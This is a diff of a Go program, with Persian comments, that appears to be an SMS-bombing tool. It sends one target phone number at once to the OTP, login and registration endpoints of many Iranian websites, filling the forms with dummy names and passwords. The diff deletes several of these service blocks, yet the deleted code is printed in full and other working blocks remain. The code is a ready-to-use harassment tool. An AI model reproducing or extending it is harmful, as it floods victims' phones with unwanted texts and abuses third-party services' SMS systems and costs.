@@ -697,42 +697,6 @@ cookieJar, _ := cookiejar.New(nil)
 				sendJSONRequest(c, ctx, "https://gateway.telewebion.com/shenaseh/api/v2/auth/step-one", payload, &wg, ch)
 			}
 		}(client)
-// --- سرویس 2: naabshop.com ---
-		wg.Add(1)
-		tasks <- func(c *http.Client) func() {
-			return func() {
-				formData := url.Values{}
-				formData.Set("login_digt_countrycode", "+98")
-				formData.Set("digits_phone", formatPhoneWithSpaces(phone)) // استفاده از تابع فرمت با فاصله
-				formData.Set("action_type", "phone")
-				formData.Set("digits_reg_name", "testname") // مقدار ثابت یا تصادفی
-				formData.Set("digits_reg_lastname", "testlastname") // مقدار ثابت یا تصادفی
-				formData.Set("digits_process_register", "1")
-				formData.Set("sms_otp", "")
-				formData.Set("otp_step_1", "1")
-				formData.Set("signup_otp_mode", "1")
-				formData.Set("rememberme", "1")
-				formData.Set("digits", "1")
-				formData.Set("instance_id", "27744fbc0c69e6e612567dd63636fde4") // ممکن است نیاز به دریافت داینامیک داشته باشد
-				formData.Set("action", "digits_forms_ajax")
-				formData.Set("type", "login")
-				formData.Set("digits_step_1_type", "")
-				formData.Set("digits_step_1_value", "")
-				formData.Set("digits_step_2_type", "")
-				formData.Set("digits_step_2_value", "")
-				formData.Set("digits_step_3_type", "")
-				formData.Set("digits_step_3_value", "")
-				formData.Set("digits_login_email_token", "")
-				formData.Set("digits_redirect_page", "//naabshop.com/?utm_medium=company_profile&utm_source=nazarkade.com&utm_campaign=domain_click") // ممکن است نیاز به دریافت داینامیک داشته باشد
-				formData.Set("digits_form", "28e10ee7bd") // ممکن است نیاز به دریافت داینامیک داشته باشد
-				formData.Set("_wp_http_referer", "/?utm_medium=company_profile&utm_source=nazarkade.com&utm_campaign=domain_click") // ممکن است نیاز به دریافت داینامیک داشته باشد
-				formData.Set("show_force_title", "1")
-				formData.Set("container", "digits_protected")
-				formData.Set("sub_action", "sms_otp")
-
-				sendFormRequest(c, ctx, "https://naabshop.com/wp-admin/admin-ajax.php", formData, &wg, ch)
-			}
-		}(client)
 
 		// --- سرویس 3: kimiaonline.com ---
 		wg.Add(1)
@@ -790,17 +754,6 @@ cookieJar, _ := cookiejar.New(nil)
 			}
 		}(client)
 
-		// --- سرویس 7: karnameh.com (ارسال OTP) ---
-		wg.Add(1)
-		tasks <- func(c *http.Client) func() {
-			return func() {
-				payload := map[string]interface{}{
-					"phone_number": phone, // شماره تلفن با صفر اول
-				}
-				sendJSONRequest(c, ctx, "https://api-gw.karnameh.com/switch/api/auth/otp/send/", payload, &wg, ch)
-			}
-		}(client)
-
 		// --- سرویس 8: zanoone.ir ---
 		wg.Add(1)
 		tasks <- func(c *http.Client) func() {
@@ -813,22 +766,6 @@ cookieJar, _ := cookiejar.New(nil)
 					"Email": "test@gmail.com", // مقدار ثابت یا تصادفی
 				}
 				sendJSONRequest(c, ctx, "https://zanoone.ir/api/auth/register", payload, &wg, ch)
-			}
-		}(client)
-
-		// --- سرویس 9: afrak.com ---
-		wg.Add(1)
-		tasks <- func(c *http.Client) func() {
-			return func() {
-				payload := map[string]interface{}{
-					"first_name": "تست نام", // مقدار ثابت یا تصادفی
-					"phone_number": phone, // شماره تلفن با صفر اول
-					"password": "testpassword123", // مقدار ثابت یا تصادفی
-					"code": "",
-					"invite_id": "",
-					"rules": true,
-				}
-				sendJSONRequest(c, ctx, "https://client.afrak.com/api/v1/pre-register", payload, &wg, ch)
 			}
 		}(client)
 
@@ -865,20 +802,6 @@ cookieJar, _ := cookiejar.New(nil)
 			}
 		}(client)
 
-		// --- سرویس 12: masterkala.com ---
-		wg.Add(1)
-		tasks <- func(c *http.Client) func() {
-			return func() {
-				// URL شامل پارامتر route
-				serviceURL := "https://masterkala.com/api/2.1.1.0.0/?route=profile/otp"
-				payload := map[string]interface{}{
-					"type": "sendotp",
-					"phone": phone, // شماره تلفن با صفر اول
-				}
-				sendJSONRequest(c, ctx, serviceURL, payload, &wg, ch)
-			}
-		}(client)
-
 		// --- سرویس 13: taminniaz.com ---
 		wg.Add(1)
 		tasks <- func(c *http.Client) func() {
@@ -912,27 +835,6 @@ cookieJar, _ := cookiejar.New(nil)
 			}
 		}(client)
 
-		// --- سرویس 15: iranous.com ---
-		wg.Add(1)
-		tasks <- func(c *http.Client) func() {
-			return func() {
-				// URL شامل پارامتر back
-				serviceURL := "https://iranous.com/login?back=my-account"
-				formData := url.Values{}
-				formData.Set("back", "my-account") // یا مقدار دیگری که لازم است
-				formData.Set("username", phone) // شماره تلفن با صفر اول
-				formData.Set("id_customer", "")
-				// back دوباره آمده، از مقدار آخر استفاده می‌کنیم یا مقداری که لازم است
-				// formData.Set("back", "")
-				formData.Set("firstname", "testfirstname") // مقدار ثابت یا تصادفی
-				formData.Set("lastname", "testlastname") // مقدار ثابت یا تصادفی
-				formData.Set("password", "testpassword123") // مقدار ثابت یا تصادفی
-				formData.Set("action", "register") // یا مقدار دیگری که لازم است (login یا register)
-				formData.Set("ajax", "1")
-
-				sendFormRequest(c, ctx, serviceURL, formData, &wg, ch)
-			}
-		}(client)
 	}
 
 	close(tasks)
